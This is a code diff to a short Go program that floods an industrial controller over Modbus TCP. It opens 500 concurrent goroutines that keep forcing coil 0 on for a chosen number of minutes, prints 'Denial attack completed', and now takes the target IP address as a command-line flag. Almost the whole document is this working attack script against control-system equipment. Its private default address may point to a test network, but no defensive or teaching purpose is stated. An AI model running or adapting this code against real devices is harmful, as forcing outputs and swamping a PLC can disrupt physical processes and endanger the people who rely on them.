@@ -7,7 +7,7 @@ import (
 	"sync"
 	"time"
 
-	"github.com/goburrow/modbus"
+	"github.com/goburrow/modbus" //Import the necessary modbus library
 )
 
 var (
@@ -19,14 +19,14 @@ var (
 )
 
 func init() {
-	flag.StringVar(&ip_address, "ip_address", "192.168.13.86", "The port on which to listen for connections")
+	flag.StringVar(&ip_address, "ip_address", "192.168.13.86", "The port on which to listen for connections") //Take in the ip address from the user
 	flag.IntVar(&runtime, "runtime", 1, "How long the program will run")
 }
 
 func jammer(target modbus.Client) {
 
 	for {
-		results, err := target.WriteSingleCoil(0, 0xFF00)
+		results, err := target.WriteSingleCoil(0, 0xFF00) //Writes a one? to coil 0 constantly
 
 		if err != nil {
 			fmt.Println(err)
@@ -37,7 +37,8 @@ func jammer(target modbus.Client) {
 
 func main() {
 	flag.Parse()
-	handler := modbus.NewTCPClientHandler("192.168.13.86:502") //Change this to be a variable
+	target := ip_address + ":502"
+	handler := modbus.NewTCPClientHandler(target)
 	handler.Timeout = 10 * time.Second
 
 	err := handler.Connect()
@@ -49,7 +50,7 @@ func main() {
 
 	client := modbus.NewClient(handler)
 
-	for i := 0; i < 500; i++ {
+	for i := 0; i < 500; i++ { //Generate 500 connections
 		wait.Add(1)
 		go jammer(client)
 	}
@@ -58,7 +59,6 @@ func main() {
 	//Runs the exploit for the specified duration
 	timer2 := time.NewTimer(time.Duration(runtime) * time.Minute)
 	go func() {
-
 		<-timer2.C
 		fmt.Println("Denial attack completed")
 		os.Exit(0)
